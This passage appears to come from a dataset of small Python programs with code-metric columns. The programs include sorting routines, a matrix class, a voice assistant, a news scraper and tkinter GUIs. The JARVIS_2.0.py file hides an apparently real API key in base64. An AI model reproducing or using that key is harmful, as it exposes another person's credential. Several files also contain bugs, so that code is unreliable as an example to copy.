            return Matrix(matrix, self.__width, self.__height)
        else:
            raise Exception(""matrix must have the same dimension!"")

    def __sub__(self, other):
        """"""
        implements the matrix-subtraction.
        """"""
        if self.__width == other.width() and self.__height == other.height():
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] - other.component(i, j))
                matrix.append(row)
            return Matrix(matrix, self.__width, self.__height)
        else:
            raise Exception(""matrix must have the same dimension!"")

    def __eq__(self, other):
        """"""
        returns true if the matrices are equal otherwise false.
        """"""
        ans = True
        if self.__width == other.width() and self.__height == other.height():
            for i in range(self.__height):
                for j in range(self.__width):
                    if self.__matrix[i][j] != other.component(i, j):
                        ans = False
                        break
        else:
            ans = False
        return ans


def squareZeroMatrix(N):
    """"""
    returns a square zero-matrix of dimension NxN
    """"""
    ans = []
    for i in range(N):
        row = []
        for j in range(N):
            row.append(0)
        ans.append(row)
    return Matrix(ans, N, N)


def randomMatrix(W, H, a, b):
    """"""
    returns a random matrix WxH with integer components
    between 'a' and 'b'
    """"""
    matrix = []
    random.seed(None)
    for i in range(H):
        row = []
        for j in range(W):
            row.append(random.randint(a, b))
        matrix.append(row)
    return Matrix(matrix, W, H)
",12481,244,219,48,9,5,155,29.0,103,72,12,149.0,128,140.0,221,939.0195500086538,1575.5715467448376,6.984375,bajo,Yes,False,True,Very High,id11
next_number.py,"x, li, small, maxx, c = input(), list(), 0, 0, 1
for i in range(len(x)):
    li.append(int(x[i]))
for i in range(len(li) - 1, -1, -1):
    if i == 0:
        print(""No Number Possible"")
        c = 0
        break
    if li[i] > li[i - 1]:
        small = i - 1
        maxx = i
        break
for i in range(small + 1, len(li)):
    if li[i] > li[small] and li[i] < li[maxx]:
        maxx = i
li[small], li[maxx] = li[maxx], li[small]
li = li[: small + 1] + sorted(li[small + 1 :])
if c:
    for i in range(len(li)):
        print(li[i], end="""")
",546,21,20,0,0,0,0,0.0,0,14,7,26.0,15,,40,78.25484338853101,178.37726474549189,6.066666666666666,bajo,No,True,False,Medium,id12
Iterative Merge Sort.py,"# Iterative Merge sort (Bottom Up)

# Iterative mergesort function to
# sort arr[0...n-1]
def mergeSort(a):

    current_size = 1

    # Outer loop for traversing Each
    # sub array of current_size
    while current_size < len(a) - 1:

        left = 0
        # Inner loop for merge call
        # in a sub array
        # Each complete Iteration sorts
        # the iterating sub array
        while left < len(a) - 1:

            # mid index = left index of
            # sub array + current sub
            # array size - 1
            mid = min((left + current_size - 1), (len(a) - 1))

            # (False result,True result)
            # [Condition] Can use current_size
            # if 2 * current_size < len(a)-1
            # else len(a)-1
            right = (2 * current_size + left - 1, len(a) - 1)[
                2 * current_size + left - 1 > len(a) - 1
            ]

            # Merge call for each sub array
            merge(a, left, mid, right)
            left = left + current_size * 2

        # Increasing sub array size by
        # multiple of 2
        current_size = 2 * current_size


# Merge Function
def merge(a, l, m, r):
    n1 = m - l + 1
    n2 = r - m
    L = [0] * n1
    R = [0] * n2
    for i in range(0, n1):
        L[i] = a[l + i]
    for i in range(0, n2):
        R[i] = a[m + i + 1]

    i, j, k = 0, 0, l
    while i < n1 and j < n2:
        if L[i] > R[j]:
            a[k] = R[j]
            j += 1
        else:
            a[k] = L[i]
            i += 1
        k += 1

    while i < n1:
        a[k] = L[i]
        i += 1
        k += 1

    while j < n2:
        a[k] = R[j]
        j += 1
        k += 1


# Driver code
a = [12, 11, 13, 5, 6, 7]
print(""Given array is "")
print(a)

mergeSort(a)

print(""Sorted array is "")
print(a)

#  This code is contributed by mohd-mehraj.
",1837,42,44,18,22,22,0,2.0,11,40,6,80.0,36,42.0,120,201.62707505625016,647.0780907334513,6.666666666666667,medio,No,False,False,Medium-High,id13
quick_sort.py,"def partition(nums, low, high):
    # We select the middle element to be the pivot. Some implementations select
    # the first element or the last element. Sometimes the median value becomes
    # the pivot, or a random one. There are many more strategies that can be
    # chosen or created.
    pivot = nums[(low + high) // 2]
    i = low - 1
    j = high + 1
    while True:
        i += 1
        while nums[i] < pivot:
            i += 1

        j -= 1
        while nums[j] > pivot:
            j -= 1

        if i >= j:
            return j

        # If an element at i (on the left of the pivot) is larger than the
        # element at j (on right right of the pivot), then swap them
        nums[i], nums[j] = nums[j], nums[i]


def quick_sort(nums):
    # Create a helper function that will be called recursively
    def _quick_sort(items, low, high):
        if low < high:
            # This is the index after the pivot, where our lists are split
            split_index = partition(items, low, high)
            _quick_sort(items, low, split_index)
            _quick_sort(items, split_index + 1, high)

    _quick_sort(nums, 0, len(nums) - 1)


# Verify it works
random_list_of_nums = [22, 5, 1, 18, 99]
quick_sort(random_list_of_nums)
print(random_list_of_nums)
",1282,24,24,8,9,9,0,3.0,6,14,6,28.0,16,,42,79.50977500432694,187.29612798276648,5.25,alto,No,False,False,Low-Medium,id14
JARVIS_2.0.py,"#########

__author__ = ""Mohammed Shokr <mohammedshokr2014@gmail.com>""
__version__ = ""v 0.1""

""""""
JARVIS:
- Control windows programs with your voice
""""""

# import modules
import datetime  # datetime module supplies classes for manipulating dates and times
import subprocess  # subprocess module allows you to spawn new processes

# master
import pyjokes # for generating random jokes
import requests
import json
from PIL import Image, ImageGrab
from gtts import gTTS

# for 30 seconds clip ""Jarvis, clip that!"" and discord ctrl+k quick-move (might not come to fruition)
from pynput import keyboard
from pynput.keyboard import Key, Listener
from pynput.mouse import Button, Controller

# =======
from playsound import *  # for sound output

# master
# auto install for pyttsx3 and speechRecognition
import os
try:
    import pyttsx3 #Check if already installed
except:# If not installed give exception
    os.system('pip install pyttsx3')#install at run time
    import pyttsx3 #import again for speak function

try :
    import speech_recognition as sr
except:
    os.system('pip install speechRecognition')
    import speech_recognition as sr # speech_recognition Library for performing speech recognition with support for Google Speech Recognition, etc..

# importing the pyttsx3 library
import webbrowser
import smtplib

# initialisation
engine = pyttsx3.init()
voices = engine.getProperty(""voices"")
engine.setProperty(""voice"", voices[0].id)
engine.setProperty(""rate"", 150)
exit_jarvis = False


def speak(audio):
    engine.say(audio)
    engine.runAndWait()


def speak_news():
    url = ""http://newsapi.org/v2/top-headlines?sources=the-times-of-india&apiKey=yourapikey""
    news = requests.get(url).text
    news_dict = json.loads(news)
    arts = news_dict[""articles""]
    speak(""Source: The Times Of India"")
    speak(""Todays Headlines are.."")
    for index, articles in enumerate(arts):
        speak(articles[""title""])
        if index == len(arts) - 1:
            break
        speak(""Moving on the next news headline.."")
    speak(""These were the top headlines, Have a nice day Sir!!.."")


def sendEmail(to, content):
    server = smtplib.SMTP(""smtp.gmail.com"", 587)
    server.ehlo()
    server.starttls()
    server.login(""youremail@gmail.com"", ""yourr-password-here"")
    server.sendmail(""youremail@gmail.com"", to, content)
    server.close()

import openai
import base64 
stab=(base64.b64decode(b'c2stMGhEOE80bDYyZXJ5ajJQQ3FBazNUM0JsYmtGSmRsckdDSGxtd3VhQUE1WWxsZFJx').decode(""utf-8""))
api_key = stab
def ask_gpt3(que):
    openai.api_key = api_key

    response = openai.Completion.create(
        engine=""text-davinci-002"",  
        prompt=f""Answer the following question: {question}\n"",
        max_tokens=150,  
        n = 1, 
        stop=None,  
        temperature=0.7  
    )

    answer = response.choices[0].text.strip()
    return answer

def wishme():
    # This function wishes user
    hour = int(datetime.datetime.now().hour)
    if hour >= 0 and hour < 12:
        speak(""Good Morning!"")
    elif hour >= 12 and hour < 18:
        speak(""Good Afternoon!"")
    else:
        speak(""Good Evening!"")
    speak(""I m Jarvis  ! how can I help you sir"")


# obtain audio from the microphone
def takecommand():
    # it takes user's command and returns string output
    wishme()
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print(""Listening..."")
        r.pause_threshold = 1
        r.dynamic_energy_threshold = 500
        audio = r.listen(source)
    try:
        print(""Recognizing..."")
        query = r.recognize_google(audio, language=""en-in"")
        print(f""User said {query}\n"")
    except Exception as e:
        print(""Say that again please..."")
        return ""None""
    return query


# for audio output instead of print
def voice(p):
    myobj = gTTS(text=p, lang=""en"", slow=False)
    myobj.save(""try.mp3"")
    playsound(""try.mp3"")


# recognize speech using Google Speech Recognition


def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stop listener
    try:
        k = key.char  # single-char keys
    except:
        k = key.name  # other keys
    if k in [""1"", ""2"", ""left"", ""right""]:  # keys of interest
        # self.keys.append(k)  # store it in global-like variable
        print(""Key pressed: "" + k)
        return False  # stop listener; remove this if want more keys


# Run Application with Voice Command Function
# only_jarvis
def on_release(key):
    print(""{0} release"".format(key))
    if key == Key.esc():
        # Stop listener
        return False
    """"""
class Jarvis:
    def __init__(self, Q):
        self.query = Q

    def sub_call(self, exe_file):
        '''
        This method can directly use call method of subprocess module and according to the
        argument(exe_file) passed it returns the output.

        exe_file:- must pass the exe file name as str object type.

        '''
        return subprocess.call([exe_file])

    def get_dict(self):
        '''
        This method returns the dictionary of important task that can be performed by the
        JARVIS module.

        Later on this can also be used by the user itself to add or update their preferred apps.
        '''
        _dict = dict(
            time=datetime.now(),
            notepad='Notepad.exe',
            calculator='calc.exe',
            stickynot='StickyNot.exe',
            shell='powershell.exe',
            paint='mspaint.exe',
            cmd='cmd.exe',
            browser='C:\\Program Files\\Internet Explorer\\iexplore.exe',
        )
        return _dict

    @property
    def get_app(self):
        task_dict = self.get_dict()
        task = task_dict.get(self.query, None)
        if task is None:
            engine.say(""Sorry Try Again"")
            engine.runAndWait()
        else:
            if 'exe' in str(task):
                return self.sub_call(task)
            print(task)
            return


# =======
""""""


def get_app(Q):
    current = Controller()
    # master
    if Q == ""time"":
        print(datetime.now())
        x = datetime.now()
        voice(x)
    elif Q == ""news"":
        speak_news()

    elif Q == ""open notepad"":
        subprocess.call([""Notepad.exe""])
    elif Q == ""open calculator"":
        subprocess.call([""calc.exe""])
    elif Q == ""open stikynot"":
        subprocess.call([""StikyNot.exe""])
    elif Q == ""open shell"":
        subprocess.call([""powershell.exe""])
    elif Q == ""open paint"":
        subprocess.call([""mspaint.exe""])
    elif Q == ""open cmd"":
        subprocess.call([""cmd.exe""])
    elif Q == ""open discord"":
        subprocess.call([""discord.exe""])
    elif Q == ""open browser"":
        subprocess.call([""C:\\Program Files\\Internet Explorer\\iexplore.exe""])
    # patch-1
    elif Q == ""open youtube"":
        webbrowser.open(""https://www.youtube.com/"")  # open youtube
    elif Q == ""open google"":
        webbrowser.open(""https://www.google.com/"")  # open google
    elif Q == ""open github"":
        webbrowser.open(""https://github.com/"")
    elif Q == ""search for"":
        que=Q.lstrip(""search for"")
        answer = ask_gpt3(que)
        
    elif (
        Q == ""email to other""
    ):  # here you want to change and input your mail and password whenver you implement
        try:
            speak(""What should I say?"")
            r = sr.Recognizer()
            with sr.Microphone() as source:
                print(""Listening..."")
                r.pause_threshold = 1
                audio = r.listen(source)
            to = ""abc@gmail.com""
            content = input(""Enter content"")
            sendEmail(to, content)
            speak(""Email has been sent!"")
        except Exception as e:
            print(e)
            speak(""Sorry, I can't send the email."")
    # =======
    #   master
    elif Q == ""Take screenshot"":
        snapshot = ImageGrab.grab()
        drive_letter = ""C:\\""
        folder_name = r""downloaded-files""
        folder_time = datetime.datetime.now().strftime(""%Y-%m-%d_%I-%M-%S_%p"")
        extention = "".jpg""
        folder_to_save_files = drive_letter + folder_name + folder_time + extention
        snapshot.save(folder_to_save_files)

    elif Q == ""Jokes"":
        speak(pyjokes.get_joke())

    elif Q == ""start recording"":
        current.add(""Win"", ""Alt"", ""r"")
        speak(""Started recording. just say stop recording to stop."")

    elif Q == ""stop recording"":
        current.add(""Win"", ""Alt"", ""r"")
        speak(""Stopped recording. check your game bar folder for the video"")

    elif Q == ""clip that"":
        current.add(""Win"", ""Alt"", ""g"")
        speak(""Clipped. check you game bar file for the video"")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    elif Q == ""take a break"":
        exit()
    else:
        answer = ask_gpt3(Q)

    # master

    apps = {
        ""time"": datetime.datetime.now(),
        ""notepad"": ""Notepad.exe"",
        ""calculator"": ""calc.exe"",
        ""stikynot"": ""StikyNot.exe"",
        ""shell"": ""powershell.exe"",
        ""paint"": ""mspaint.exe"",
        ""cmd"": ""cmd.exe"",
        ""browser"": ""C:\\Program Files\Internet Explorer\iexplore.exe"",
        ""vscode"": ""C:\\Users\\Users\\User\\AppData\\Local\\Programs\Microsoft VS Code""
    }
    # master


# Call get_app(Query) Func.

if __name__ == ""__main__"":
    while not exit_jarvis:
        Query = takecommand().lower()
        get_app(Query)
    exit_jarvis = True
",9457,188,204,51,42,25,46,10.0,43,38,8,75.0,50,,113,306.1928094887362,661.9518524494156,6.0,bajo,No,True,False,Medium-High,id15
factors.py,"import math

print(""The factors of the number you type when prompted will be displayed"")
a = int(input(""Type now // ""))
b = 1
while b <= math.sqrt(a):
    if a % b == 0:
        print(""A factor of the number is "", b)
        print(""A factor of the number is "", int(a / b))
    b += 1
",284,9,9,1,0,0,0,0.0,0,5,5,10.0,6,,15,27.11941547876375,51.89147427955947,4.166666666666667,medio,No,True,False,Low,id16
new.py,"""""""
a simple terminal program to find new about certain topic by web scraping site.
site used :
1. Times of India,
   link : https://timesofindia.indiatimes.com/india/
2. India's Today,
   link : https://www.indiatoday.in/topic/
""""""

import requests
from bs4 import BeautifulSoup
import webbrowser
import time


def Times_of_India(userInput, ua):
    bold_start = ""\033[1m""
    bold_end = ""\033[0m""

    url = ""https://timesofindia.indiatimes.com/india/""
    url += userInput

    res = requests.post(url, headers=ua)
    soup = BeautifulSoup(res.content, ""html.parser"")
    data = soup.find_all(class_=""w_tle"")

    if len(data) > 0:
        print(""News available :"", ""\N{slightly smiling face}"")
    if len(data) == 0:
        return 0

    for item in range(len(data)):
        print(bold_start, ""\033[1;32;40m \nNEWS : "", item + 1, bold_end, end=""  "")
        data1 = data[item].find(""a"")
        print(bold_start, data1.get_text(), bold_end)

        bol = input(""For more details ->(y) (y/n) :: "")
        if bol == ""y"":
            url += data1.get(""href"")
            print(""%s"" % url)

            webbrowser.open(url)

    return len(data)


def india_today(userInput, ua):
    bold_start = ""\033[1m""
    bold_end = ""\033[0m""

    url = ""https://www.indiatoday.in/topic/""
    url += userInput

    res = requests.get(url, headers=ua)
    soup = BeautifulSoup(res.content, ""html.parser"")
    data = soup.find_all(class_=""field-content"")

    if len(data) > 0:
        print(""\nNews available : "", ""\N{slightly smiling face}"")
    k = 0
    for i in range(len(data)):
        data1 = data[i].find_all(""a"")
        for j in range(len(data1)):
            print(bold_start, ""\033[1;32;40m\nNEWS "", k + 1, bold_end, end="" : "")
            k += 1
            print(bold_start, data1[j].get_text(), bold_end)
            bol = input(""\nFor more details ->(y) (y/n) :: "")
            if bol == ""y"" or bol == ""Y"":
                data2 = data[i].find(""a"")
                url = data2.get(""href"")
                webbrowser.open(url)

    return len(data)


if __name__ == ""__main__"":
    import doctest

    doctest.testmod()
    bold_start = ""\033[1m""
    bold_end = ""\033[0m""
    print(""\033[5;31;40m"")
    print(
        bold_start,
        ""                 HERE YOU WILL GET ALL THE NEWS JUST IN ONE SEARCH                   "",
        bold_end,
    )
    print(""\n"")
    localtime = time.asctime(time.localtime(time.time()))
    print(bold_start, localtime, bold_end)

    ua = {
        ""UserAgent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0""
    }
    print(
        bold_start,
        ""\n\033[1;35;40m Search any news (state , city ,Country , AnyThings etc) : "",
        bold_end,
        end="" "",
    )

    userInput = input()

    print(bold_start, ""\033[1;33;40m \n"")
    print(""Which news channel data would you prefer"")
    print(""1. Times of india"")
    print(""2. India's Today"", bold_end)

    say = int(input())

    if say == 1:
        length = Times_of_India(userInput, ua)
        if length == 0:
            print(""Sorry Here No News Available"", ""\N{expressionless face}"")
            print(""\n"")
            print(
                ""Would you like to go for India's Today (y/n):: "",
                ""\N{thinking face}"",
                end=""  "",
            )
            speak = input()
            if speak == ""y"":
                length = india_today(userInput, ua)
                if length == 0:
                    print(""Sorry No news"", ""\N{expressionless face}"")
                else:
                    print(""\nThank you"", ""\U0001f600"")

        elif say == 2:
            length = india_today(userInput, ua)

            if length == 0:
                print(""Sorry No news"")
            else:
                print(""\nThank you"", ""\U0001f600"")
    else:
        print(""Sorry"", ""\N{expressionless face}"")
",3878,90,103,26,0,0,8,2.0,11,21,5,42.0,31,,63,165.18972609642998,325.70527509086565,3.3870967741935485,bajo,No,True,False,Medium,id17
Secret message generator GUI by tkinter.py,"import tkinter

root = tkinter.Tk()
root.geometry(""360x470"")
root.title(""SECRET MESSAGE CODER DECODER"")

name1 = tkinter.StringVar()
name2 = tkinter.StringVar()
result1 = tkinter.StringVar()
r1 = tkinter.Label(
    root,
    text="""",
    textvariable=result1,
    fg=""green"",
    bg=""white"",
    font=(""lucida handwriting"", 15, ""bold"", ""underline""),
)
r1.place(x=10, y=150)
result2 = tkinter.StringVar()
r2 = tkinter.Label(
    root,
    text="""",
    textvariable=result2,
    fg=""green"",
    bg=""white"",
    font=(""lucida handwriting"", 15, ""bold"", ""underline""),
)
r2.place(x=0, y=380)
a = tkinter.Entry(
    root,
    text="""",
    textvariable=name1,
    bd=5,
    bg=""light grey"",
    fg=""red"",
    font=(""bold"", 20),
)
a.place(x=0, y=50)
b = tkinter.Entry(
    root,
    text="""",
    textvariable=name2,
    bd=5,
    bg=""light grey"",
    fg=""red"",
    font=(""bold"", 20),
)
b.place(x=0, y=270)
t1 = tkinter.Label(
    root, text=""TYPE MESSAGE:"", font=(""arial"", 20, ""bold"", ""underline""), fg=""red""
)
t2 = tkinter.Label(
    root, text=""TYPE SECRET MESSAGE:"", font=(""arial"", 20, ""bold"", ""underline""), fg=""red""
)
t1.place(x=10, y=0)
t2.place(x=10, y=220)


def show1():
    data1 = name1.get()
    codes = {
        ""b"": ""a"",
        ""c"": ""b"",
        ""d"": ""c"",
        ""e"": ""d"",
        ""f"": ""e"",
        ""g"": ""f"",
        ""h"": ""g"",
        ""i"": ""h"",
        ""j"": ""i"",
        ""k"": ""j"",
        ""l"": ""k"",
        ""m"": ""l"",
        ""n"": ""m"",
        ""o"": ""n"",
        ""p"": ""o"",
        ""q"": ""p"",
        ""r"": ""q"",
        ""s"": ""r"",
        ""t"": ""s"",
        ""u"": ""t"",
        ""v"": ""u"",
        ""w"": ""v"",
        ""x"": ""w"",
        ""y"": ""x"",
        ""z"": ""y"",
        ""a"": ""z"",
        "" "": "" "",
        ""B"": ""A"",
        ""C"": ""B"",
        ""D"": ""C"",
        ""E"": ""D"",
        ""F"": ""E"",
        ""G"": ""F"",
        ""H"": ""G"",
        ""I"": ""H"",
        ""J"": ""I"",
        ""K"": ""J"",
        ""L"": ""K"",
        ""M"": ""L"",
        ""N"": ""M"",
        ""O"": ""N"",
        ""P"": ""O"",
        ""Q"": ""P"",
        ""R"": ""Q"",
        ""S"": ""R"",
        ""T"": ""S"",
        ""U"": ""T"",
        ""V"": ""U"",
        ""W"": ""V"",
        ""X"": ""W"",
        ""Y"": ""X"",
        ""Z"": ""Y"",
        ""A"": ""Z"",
    }
    lol1 = """"
    for x in data1:
        lol1 = lol1 + codes[x]
    name1.set("""")
    result1.set(""SECRET MESSAGE IS:-\n"" + lol1)
    return


bt1 = tkinter.Button(
    root,
    text=""OK"",
    bg=""white"",
    fg=""black"",
    bd=5,
    command=show1,
    font=(""calibri"", 15, ""bold"", ""underline""),
)
bt1.place(x=10, y=100)


def show2():
    data2 = name2.get()
    codes = {
        ""a"": ""b"",
        ""b"": ""c"",
        ""c"": ""d"",
        ""d"": ""e"",
        ""e"": ""f"",
        ""f"": ""g"",
        ""g"": ""h"",
        ""h"": ""i"",
        ""i"": ""j"",
        ""j"": ""k"",
        ""k"": ""l"",
        ""l"": ""m"",
        ""m"": ""n"",
        ""n"": ""o"",
        ""o"": ""p"",
        ""p"": ""q"",
        ""q"": ""r"",
        ""r"": ""s"",
        ""s"": ""t"",
        ""t"": ""u"",
        ""u"": ""v"",
        ""v"": ""w"",
        ""w"": ""x"",
        ""x"": ""y"",
        ""y"": ""z"",
        ""z"": ""a"",
        "" "": "" "",
        ""A"": ""B"",
        ""B"": ""C"",
        ""C"": ""D"",
        ""D"": ""E"",
        ""E"": ""F"",
        ""F"": ""G"",
        ""G"": ""H"",
        ""H"": ""I"",
        ""I"": ""J"",
        ""J"": ""K"",
        ""K"": ""L"",
        ""L"": ""M"",
        ""M"": ""N"",
        ""N"": ""O"",
        ""O"": ""P"",
        ""P"": ""Q"",
        ""Q"": ""R"",
        ""R"": ""S"",
        ""S"": ""T"",
        ""T"": ""U"",
        ""U"": ""V"",
        ""V"": ""W"",
        ""W"": ""X"",
        ""X"": ""Y"",
        ""Y"": ""Z"",
        ""Z"": ""A"",
    }
    lol2 = """"
    for x in data2:
        lol2 = lol2 + codes[x]
    name2.set("""")
    result2.set(""MESSAGE IS:-\n"" + lol2)
    return


bt2 = tkinter.Button(
    root,
    text=""OK"",
    bg=""white"",
    fg=""black"",
    bd=5,
    command=show2,
    font=(""calibri"", 15, ""bold"", ""underline""),
)
bt2.place(x=10, y=320)
root.mainloop()
",3837,45,201,10,0,0,0,2.0,4,4,1,8.0,6,,12,15.509775004326936,33.68825906469125,0.6666666666666666,bajo,No,False,False,Low,id18
TTS.py,"from tkinter import *
from platform import system

if system() == ""Windows"" or ""nt"":
    import win32com.client as wincl
else:
    print(""Sorry, TTS client is not supported on Linux or MacOS"")
    exit()


def text2Speech():
    text = e.get()
    speak = wincl.Dispatch(""SAPI.SpVoice"")
    speak.Speak(text)


# window configs
tts = Tk()
tts.wm_title(""Text to Speech"")
tts.geometry(""225x105"")
tts.config(background=""#708090"")

f = Frame(tts, height=280, width=500, bg=""#bebebe"")
f.grid(row=0, column=0, padx=10, pady=5)
lbl = Label(f, text=""Enter your Text here : "")
lbl.grid(row=1, column=0, padx=10, pady=2)
e = Entry(f, width=30)
e.grid(row=2, column=0, padx=10, pady=2)
btn = Button(f, text=""Speak"", command=text2Speech)
btn.grid(row=3, column=0, padx=20, pady=10)
tts.mainloop()
",816,24,24,6,1,1,0,1.0,1,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,False,False,Low,id19
Differentiate_List.py,"# this code gives the numbers of integers, floats, and strings present in the list


a = [""Hello"", 35, ""b"", 45.5, ""world"", 60]
i = f = s = 0
for j in a:
    if isinstance(j, int):
        i = i + 1
    elif isinstance(j, float):
        f = f + 1
    else:
        s = s + 1
print(f""Number of integers are: {i}"")
print(f""Number of Floats are: {f}"")
print(f""numbers of strings are: {s}"")
",387,12,12,2,1,1,0,0.0,0,3,1,6.0,4,,9,8.0,20.89735285398626,0.75,alto,No,False,False,Low,id20
recursive-fibonacci.py,"def fib(n):
    if n == 0 or n == 1:
        return n
    else:
        return fib(n - 1) + fib(n - 2)
",103,5,5,0,0,0,0,1.0,3,6,4,12.0,8,12.0,18,32.0,64.52932501298082,3.0,medio,No,False,False,Low,id21
test_case.py,"#  ------------------------------------------------- ###
#  ------------------------------------------------- ###
#  ### Developed by TANMAY KHANDELWAL (aka Dude901). ###
#  _________________________________________________ ###
#  _________________________________________________ ###

from tkinter import *
from random import randint, choices
import webbrowser
import os

mycolor = ""#262626""


class Case:
    def __init__(self, master):
        gen_frame = Frame(master)
        gen_frame.grid()
        self.test_case_counter = None

    def home(self):
        self.statement = Label(
            gui,
            text=""Select Test Case Type"",
            fg=""white"",
            height=1,
            font=(""calibre"", 12, ""normal""),
        )
        self.statement.configure(bg=mycolor)
        self.button1 = Button(
            gui,
            justify=LEFT,
            text=""T\nn   \nA1 A2 A3...An\nn   \nA1 A2 A3...An"",
            width=13,
            fg=""white"",
            bd=3,
            command=lambda: Type1(gui),
            bg=""red"",
            font=""calibre"",
        )
        self.button1.configure(background=""grey20"")
        self.button2 = Button(
            gui,
            justify=LEFT,
            text=""T\nn  m  \nA1 A2 A3...An\nn  m\nA1 A2 A3...An"",
            fg=""white"",
            command=lambda: Type2(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button2.configure(background=""grey20"")
        self.button3 = Button(
            gui,
            justify=LEFT,
            text=""T\nA1  B1\nA2  B2\n(t rows of)\n(A, B pair)"",
            fg=""white"",
            command=lambda: Type3(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button3.configure(background=""grey20"")
        self.button4 = Button(
            gui,
            justify=LEFT,
            text=""T\nn  m  \nA1 A2...An\nB1 B2...Bm\n...  ..."",
            fg=""white"",
            command=lambda: Type4(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button4.configure(background=""grey20"")
        self.button5 = Button(
            gui,
            justify=LEFT,
            text=""T\nn  m  k\nn  m  k\n(t rows of)\n(n m k  pair)"",
            fg=""white"",
            command=lambda: Type5(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button5.configure(background=""grey20"")
        self.button6 = Button(
            gui,
            justify=LEFT,
            text=""n * m (matrix)\nA1  A2...Am\nA1  A2...Am\n__   __ ... __\n""
            ""A1  A2...Am"",
            fg=""white"",
            command=lambda: Type6(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button6.configure(background=""grey20"")
        self.button7 = Button(
            gui,
            justify=LEFT,
            text=""T\nn\nCustom string\n(ex: 0 1)\n(ex: + / -)"",
            fg=""white"",
            command=lambda: Type7(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button7.configure(background=""grey20"")
        self.button8 = Button(
            gui,
            justify=LEFT,
            text=""T\nn  m\nA1  B1\n...   ...\nAm  Bm"",
            fg=""white"",
            command=lambda: Type8(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button8.configure(background=""grey20"")
        self.button9 = Button(
            gui,
            justify=LEFT,
            text='T\nCustom string\n(without ""n"")\n(ex: 0 1)\n(ex: + / -)',
            fg=""white"",
            command=lambda: Type9(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button9.configure(background=""grey20"")
        self.button10 = Button(
            gui,
            justify=LEFT,
            text=""T\nn  k  m\nA1 A2...An\nn  k  m\nA1 A2...An"",
            fg=""white"",
            command=lambda: Type10(gui),
            width=13,
            font=""calibre"",
            bd=3,
        )
        self.button10.configure(background=""grey20"")
        self.button_new = Button(
            gui,
            text="" ANOTHER TYPE "",
            fg=""black"",
            width=13,
            font=""calibre"",
            bd=3,
            command=lambda: self.newformat(self=Case),
        )
        self.button_exit = Button(
            gui,
            text="" EXIT "",
            fg=""black"",
            width=11,
            font=""calibre"",
            bd=3,
            command=lambda: gui.destroy(),
        )
        self.copyright_label = Button(
            gui,
            text=""Â© Dude901"",
            fg=""white"",
            width=7,
            height=1,
            bd=3,
            command=lambda: webbrowser.open_new_tab(""https://github.com/Tanmay-901""),
            font=(""calibre"", 6, ""normal""),
        )
        self.copyright_label.configure(bg=mycolor)
        self.retrieve_home(self)

    def newformat(self):
        url = ""https://forms.gle/UVdo6QMAwBNxa9Ln7""
        webbrowser.open_new_tab(url)

    def forget_home(self):
        self.statement.place_forget()
        self.button1.grid_forget()
        self.button2.grid_forget()
        self.button3.grid_forget()
        self.button4.grid_forget()
        self.button5.grid_forget()
        self.button6.grid_forget()
        self.button7.grid_forget()
        self.button8.grid_forget()
        self.button9.grid_forget()
        self.button10.grid_forget()
        self.button_new.grid_forget()
        self.button_exit.grid_forget()

    def retrieve_home(self):
        self.statement.place(relx=0.39, rely=0.005)
        self.button1.grid(row=1, column=0, ipady=10, pady=27, padx=10)
        self.button2.grid(row=1, column=1, ipady=10, pady=27, padx=10)
        self.button3.grid(row=1, column=2, ipady=10, pady=27, padx=10)
        self.button4.grid(row=1, column=3, ipady=10, pady=27, padx=10)
        self.button5.grid(row=1, column=4, ipady=10, pady=27, padx=10)
        self.button6.grid(row=2, column=0, ipady=10, pady=13, padx=10)
        self.button7.grid(row=2, column=1, ipady=10, pady=13, padx=10)
        self.button8.grid(row=2, column=2, ipady=10, pady=13, padx=10)
        self.button9.grid(row=2, column=3, ipady=10, pady=13, padx=10)
        self.button10.grid(row=2, column=4, ipady=10, pady=13, padx=10)
        self.button_new.grid(row=3, column=1, ipady=10, pady=13, padx=10)
        self.button_exit.grid(row=3, column=3, ipady=10, pady=13, padx=10)
        self.copyright_label.place(relx=0.92, rely=0.005)

    def cpy(self):
        txt = self.output.get(""1.0"", END)
        gui.clipboard_clear()
        gui.clipboard_append(txt.strip())

    def done(self, output):
        self.a = [0]
        self.try_forget()
        self.retrieve_home()
        pass

    def display(self):
        self.y_scroll = Scrollbar(gui)
        self.x_scroll = Scrollbar(gui, orient=HORIZONTAL)
        self.y_scroll.grid(row=0, column=11, sticky=""NS"", pady=(22, 0), padx=(0, 20))
        self.x_scroll.grid(
            row=1, sticky=""EW"", columnspan=10, padx=(20, 0), pady=(0, 30)
        )
        self.output = Text(
            gui,
            height=12,
            bg=""light cyan"",
            width=82,
            yscrollcommand=self.y_scroll.set,
            xscrollcommand=self.x_scroll.set,
            wrap=""none"",
        )
        # self.output = ScrolledText(gui, height=12, bg=""light cyan"", width=82, wrap='none',
        # xscrollcommand=x_scroll.set)    # only for y scroll
        self.output.grid(
            row=0,
            column=0,
            columnspan=10,
            sticky=""n"",
            ipady=10,
            padx=(20, 0),
            pady=(22, 0),
        )
        self.y_scroll.config(command=self.output.yview)
        self.x_scroll.config(command=self.output.xview)
        self.copy_button = Button(
            gui,
            text=""COPY"",
            fg=""black"",
            width=18,
            command=self.cpy,
            font=""calibre"",
            bd=3,
        )
        self.copy_button.grid(
            row=2, column=3, sticky=""SW"", ipady=10, pady=(10, 18), padx=15
        )
        self.generate_button = Button(
            gui,
            text=""RE-GENERATE"",
            width=23,
            fg=""black"",
            command=lambda: self.generate(),
            font=""calibre"",
            bd=3,
        )
        self.generate_button.grid(row=2, column=4, ipady=10, pady=(10, 18), padx=15)

        self.change_values_button = Button(
            gui,
